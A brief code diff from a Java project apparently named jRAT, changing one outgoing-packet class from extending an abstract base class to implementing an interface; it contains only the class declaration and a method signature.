@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet9InitJavaVersion extends AbstractOutgoingPacket {
+public class Packet9InitJavaVersion implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
